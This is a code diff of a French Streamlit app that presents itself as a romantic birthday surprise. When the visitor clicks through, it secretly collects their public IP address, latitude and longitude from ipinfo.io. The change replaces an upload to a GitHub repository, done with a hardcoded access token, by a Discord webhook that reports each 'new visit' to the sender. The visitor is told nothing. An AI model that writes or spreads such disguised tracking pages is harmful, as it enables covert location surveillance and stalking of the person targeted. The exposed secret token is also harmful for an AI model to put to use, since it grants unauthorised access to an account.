@@ -1,7 +1,6 @@
 import streamlit as st
 import requests
 import datetime
-import base64
 
 # --- Configuration de la page ---
 st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")
@@ -31,46 +30,19 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# --- Fonction ultra-fiable pour envoyer sur GitHub via l'API REST ---
-def envoyer_sur_github(contenu_texte):
-    # Collez votre token ici entre les guillemets
-    GITHUB_TOKEN = "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"
-    NOM_REPO = "B1ackeag1e/Test"  # Bien vérifier le '1'
-    NOM_FICHIER = "informations.txt"
-    
-    url = f"https://api.github.com/repos/{NOM_REPO}/contents/{NOM_FICHIER}"
-    
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
-    
-    # 1. Vérifier si le fichier existe déjà pour récupérer son SHA (nécessaire pour modifier un fichier existant)
-    sha = None
-    r_check = requests.get(url, headers=headers)
-    if r_check.status_code == 200:
-        sha = r_check.json().get("sha")
-        
-    # 2. Encoder le contenu en Base64 (obligatoire pour l'API GitHub)
-    contenu_b64 = base64.b64encode(contenu_texte.encode("utf-8")).decode("utf-8")
-    
-    message_commit = f"Mise à jour des informations - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+# --- Fonction d'envoi instantané via Webhook Discord ---
+def envoyer_sur_discord(contenu_texte):
+    WEBHOOK_URL = "VOTRE_URL_WEBHOOK_DISCORD_ICI"  # Collez l'URL de votre webhook ici
     
     payload = {
-        "message": message_commit,
-        "content": contenu_b64
+        "content": f"🚨 **Nouvelle visite détectée !**\n```\n{contenu_texte}\n```"
     }
     
-    if sha:
-        payload["sha"] = sha  # Ajout du SHA si le fichier existe déjà
-        
-    # 3. Envoyer la requête PUT à GitHub
-    r_put = requests.put(url, headers=headers, json=payload)
-    
-    if r_put.status_code in [200, 201]:
-        return True, "Succès"
-    else:
-        return False, f"Code {r_put.status_code}: {r_put.text}"
+    try:
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        return response.status_code == 204
+    except:
+        return False
 
 # --- Gestion des étapes avec la Session State ---
 if "etape" not in st.session_state:
@@ -120,7 +92,7 @@ elif st.session_state.etape == 3:
     
     if st.button("Prêt(e) ! Découvrir la surprise 🌹"):
         # --- COLLECTE DES INFORMATIONS ---
-        contenu_txt = "=== RAPPORT DES INFORMATIONS DE CONNEXION ===\n\n"
+        contenu_txt = ""
         try:
             r = requests.get("https://ipinfo.io/json", timeout=5)
             if r.ok:
@@ -135,19 +107,15 @@ elif st.session_state.etape == 3:
                 contenu_txt += f"Latitude    : {lat}\n"
                 contenu_txt += f"Longitude   : {lon}\n"
                 contenu_txt += f"IP publique : {d.get('ip', 'Inconnue')}\n"
-                contenu_txt += f"Date/Heure  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                contenu_txt += f"Date/Heure  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         except Exception as e:
-            contenu_txt += f"Erreur lors de la récupération : {e}\n"
+            contenu_txt += f"Erreur récupération : {e}"
         
-        # Enregistrement sur GitHub
-        succes, message_erreur = envoyer_sur_github(contenu_txt)
+        # Envoi instantané
+        envoyer_sur_discord(contenu_txt)
         
-        if succes:
-            st.success("Fichier envoyé avec succès sur GitHub !")
-            st.session_state.etape = 4
-            st.rerun()
-        else:
-            st.error(f"Échec de l'envoi GitHub : {message_erreur}")
+        st.session_state.etape = 4
+        st.rerun()
 
 # ==========================================
 # ÉTAPE 4 : La page finale d'anniversaire
@@ -159,7 +127,7 @@ elif st.session_state.etape == 4:
     ### Mon cœur,
     
     Si tu lis ce message, c'est que tu as passé toutes les étapes avec succès. 
-    Cette petite application a été codée rien que pour toi, pour te prouver à quel point tu es unique et importante à mes yeux.
+    Cette petite application a été codée rien que pour toi, pour te prouver à quel point tu es unique et importante à yeux.
     
     Je te souhaite le plus merveilleux des anniversaires, rempli de bonheur, de sourires et de tout l'amour que tu mérites.
     
